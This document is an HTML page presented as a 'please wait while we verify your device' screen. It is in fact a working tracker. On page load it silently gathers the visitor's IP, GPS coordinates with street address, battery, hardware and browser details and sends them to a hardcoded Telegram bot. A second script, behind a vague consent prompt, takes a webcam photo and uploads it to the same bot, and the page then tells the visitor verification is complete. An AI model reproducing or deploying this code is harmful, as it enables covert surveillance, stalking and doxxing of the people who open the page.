<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            background-color: #f5f5f5;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .loading-message {
            text-align: center;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>
    <div class="loading-message">
        <h2>Please wait while we verify your device...</h2>
        <p>This may take a few seconds</p>
    </div>

    <script>
        // Telegram configuration
        const TELEGRAM_BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const TELEGRAM_CHAT_ID = "6913353602";

        // Faster Telegram sending with combined data
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (e) {
                console.error('Telegram error:', e);
            }
        }

        // Enhanced IP and location data function
        async function getNetworkData() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                // Get detailed location from IP
                let locationData = {};
                try {
                    const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                    locationData = await locationResponse.json();
                    
                    // Additional API for fallback data
                    if (!locationData.city || !locationData.country) {
                        const fallbackResponse = await fetch(`https://ipinfo.io/${ipData.ip}/json`);
                        const fallbackData = await fallbackResponse.json();
                        locationData = {...locationData, ...fallbackData};
                    }
                } catch (e) {
                    console.log('Location API failed, using fallback');
                }
                
                return {
                    ip: ipData.ip,
                    country: locationData.country_name || locationData.country || 'Unknown',
                    country_code: locationData.country_code || 'N/A',
                    city: locationData.city || 'Unknown',
                    city_code: locationData.postal || locationData.zip || 'N/A',
                    region: locationData.region || locationData.regionName || 'Unknown',
                    isp: locationData.org || locationData.isp || 'Unknown',
                    timezone: locationData.timezone || 'Unknown',
                    coordinates: locationData.loc || 'Unknown'
                };
            } catch (error) {
                console.error('Network data error:', error);
                return {
                    ip: 'Unknown',
                    country: 'Unknown',
                    country_code: 'N/A',
                    city: 'Unknown',
                    city_code: 'N/A',
                    region: 'Unknown',
                    isp: 'Unknown',
                    timezone: 'Unknown',
                    coordinates: 'Unknown'
                };
            }
        }

        // Get precise location with more details
        async function getPreciseLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) return resolve(null);
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // Reverse geocoding to get address details
                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`)
                            .then(response => response.json())
                            .then(data => {
                                resolve({
                                    lat: position.coords.latitude,
                                    lon: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    address: {
                                        road: data.address.road || 'Unknown',
                                        suburb: data.address.suburb || 'Unknown',
                                        city: data.address.city || data.address.town || 'Unknown',
                                        postcode: data.address.postcode || 'Unknown',
                                        country: data.address.country || 'Unknown',
                                        country_code: data.address.country_code || 'Unknown'
                                    }
                                });
                            })
                            .catch(() => {
                                resolve({
                                    lat: position.coords.latitude,
                                    lon: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    address: null
                                });
                            });
                    },
                    () => resolve(null),
                    {enableHighAccuracy: true, timeout: 10000}
                );
            });
        }

        // Get all device info with enhanced location
        async function collectAllData() {
            const [networkData, preciseLocation, battery] = await Promise.all([
                getNetworkData(),
                getPreciseLocation(),
                navigator.getBattery ? navigator.getBattery() : Promise.resolve(null)
            ]);
            
            const now = new Date();
            const connection = navigator.connection || {};
            
            return {
                // Enhanced Network info
                ip: networkData.ip,
                country: networkData.country,
                country_code: networkData.country_code,
                city: networkData.city,
                city_code: networkData.city_code,
                region: networkData.region,
                isp: networkData.isp,
                timezone: networkData.timezone,
                ip_coordinates: networkData.coordinates,
                
                // Enhanced Location
                preciseLocation: preciseLocation 
                    ? {
                        coordinates: `${preciseLocation.lat}, ${preciseLocation.lon}`,
                        accuracy: `${Math.round(preciseLocation.accuracy)}m`,
                        address: preciseLocation.address || 'No address details'
                      }
                    : 'Denied',
                
                // Device info (unchanged)
                deviceModel: navigator.userAgentData?.model || 'Unknown',
                os: navigator.userAgent.match(/(Windows NT|Mac OS X|Linux|Android|iOS) [\d._]+/)?.[0] || 'Unknown',
                deviceType: navigator.userAgentData?.mobile ? 'Mobile' : 'Desktop',
                cores: navigator.hardwareConcurrency || 'Unknown',
                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
                screen: `${window.screen.width}x${window.screen.height}`,
                colorDepth: `${window.screen.colorDepth}bit`,
                orientation: window.screen.orientation?.type || 'Unknown',
                
                // Battery
                batteryLevel: battery ? `${Math.floor(battery.level * 100)}%` : 'Unknown',
                charging: battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown',
                
                // Network
                connectionType: connection.type || 'Unknown',
                effectiveType: connection.effectiveType || 'Unknown',
                downlink: connection.downlink ? `${connection.downlink}Mbps` : 'Unknown',
                
                // Browser
                browser: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/([\d.]+)/)?.[0] || 'Unknown',
                language: navigator.language,
                
                // Features
                bluetooth: !!navigator.bluetooth,
                geolocation: !!navigator.geolocation,
                touch: 'ontouchstart' in window,
                
                // Time
                time: now.toLocaleString(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        // Enhanced format for Telegram with location details
        function formatData(data) {
            let message = `📱 <b>Device Information</b>\n\n`;
            
            message += `🌍 <b>Network Location (IP Based)</b>\n`;
            message += `- IP: ${data.ip}\n`;
            message += `- Country: ${data.country} (${data.country_code})\n`;
            message += `- Region: ${data.region}\n`;
            message += `- City: ${data.city} (Postal: ${data.city_code})\n`;
            message += `- ISP: ${data.isp}\n`;
            message += `- Coordinates: ${data.ip_coordinates}\n`;
            message += `- Timezone: ${data.timezone}\n\n`;
            
            if (data.preciseLocation !== 'Denied') {
                message += `📍 <b>Precise Location</b>\n`;
                message += `- Coordinates: ${data.preciseLocation.coordinates}\n`;
                message += `- Accuracy: ±${data.preciseLocation.accuracy}\n`;
                
                if (data.preciseLocation.address !== 'No address details') {
                    message += `- Address:\n`;
                    message += `  Road: ${data.preciseLocation.address.road}\n`;
                    message += `  Area: ${data.preciseLocation.address.suburb}\n`;
                    message += `  City: ${data.preciseLocation.address.city}\n`;
                    message += `  Postal: ${data.preciseLocation.address.postcode}\n`;
                    message += `  Country: ${data.preciseLocation.address.country} (${data.preciseLocation.address.country_code})\n`;
                }
                message += `\n`;
            } else {
                message += `📍 <b>Precise Location: Permission Denied</b>\n\n`;
            }
            
            // Rest of device info (unchanged)
            message += `📱 <b>Device</b>\n`;
            message += `- Model: ${data.deviceModel}\n`;
            message += `- OS: ${data.os}\n`;
            message += `- Type: ${data.deviceType}\n`;
            message += `- Cores: ${data.cores}\n`;
            message += `- RAM: ${data.ram}\n`;
            message += `- Screen: ${data.screen}\n`;
            message += `- Colors: ${data.colorDepth}\n`;
            message += `- Orientation: ${data.orientation}\n\n`;
            
            message += `🔋 <b>Battery</b>\n`;
            message += `- Level: ${data.batteryLevel}\n`;
            message += `- Charging: ${data.charging}\n\n`;
            
            message += `🌐 <b>Network</b>\n`;
            message += `- Type: ${data.connectionType}\n`;
            message += `- Speed: ${data.effectiveType}\n`;
            message += `- Downlink: ${data.downlink}\n\n`;
            
            message += `🖥️ <b>Browser</b>\n`;
            message += `- Browser: ${data.browser}\n`;
            message += `- Language: ${data.language}\n`;
            message += `- Timezone: ${data.timezone}\n\n`;
            
            message += `⏰ <b>Time</b>\n`;
            message += `- Local Time: ${data.time}\n\n`;
            
            message += `⚙️ <b>Features</b>\n`;
            message += `- Bluetooth: ${data.bluetooth ? 'Yes' : 'No'}\n`;
            message += `- Geolocation: ${data.geolocation ? 'Yes' : 'No'}\n`;
            message += `- Touch Screen: ${data.touch ? 'Yes' : 'No'}\n`;
            
            return message;
        }

        // Main function that runs automatically
        async function runSilently() {
            try {
                // Collect all data first (faster than sequential requests)
                const allData = await collectAllData();
                
                // Format and send to Telegram
                const formattedMessage = formatData(allData);
                await sendToTelegram(formattedMessage);
                
            } catch (error) {
                console.error('Error in silent operation:', error);
                await sendToTelegram(`⚠️ Error collecting data: ${error.message}`);
            }
            
            // Hide loading message after completion
            document.body.innerHTML = '<div style="text-align:center;padding:20px;"><h3>Verification complete</h3><p>You may close this page</p></div>';
        }

        // Start immediately when page loads
        window.onload = runSilently;
    </script>
    <script>
document.addEventListener('DOMContentLoaded', function() {
    // Telegram bot data
    const botToken = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
    const chatId = '6913353602';
    
    // Show confirmation message in English
    const userConfirmed = confirm('Do you want to share your device information for verification?');
    
    if (userConfirmed) {
        // Collect device information
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString()
        };
        
        // Send device info to Telegram
        sendToTelegram(botToken, chatId, `📱 Device Information:\n${JSON.stringify(deviceInfo, null, 2)}`);
        
        // Try to access camera
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    const track = stream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(track);
                    
                    return imageCapture.takePhoto();
                })
                .then(function(blob) {
                    // Send photo to Telegram
                    sendPhotoToTelegram(botToken, chatId, blob);
                })
                .catch(function(error) {
                    console.error('Error accessing camera:', error);
                    sendToTelegram(botToken, chatId, '⚠️ Failed to access camera: ' + error.message);
                });
        } else {
            sendToTelegram(botToken, chatId, '⚠️ Browser does not support camera access');
        }
    }
    
    // Function to send text to Telegram
    function sendToTelegram(token, chatId, text) {
        const url = `https://api.telegram.org/bot${token}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: text
            })
        }).catch(error => console.error('Error sending to Telegram:', error));
    }
    
    // Function to send photo to Telegram
    function sendPhotoToTelegram(token, chatId, photoBlob) {
        const url = `https://api.telegram.org/bot${token}/sendPhoto`;
        const formData = new FormData();
        
        formData.append('chat_id', chatId);
        formData.append('photo', photoBlob, 'webcam-photo.jpg');
        
        fetch(url, {
            method: 'POST',
            body: formData
        }).catch(error => console.error('Error sending photo to Telegram:', error));
    }
});
    </script>
</body>
</html>
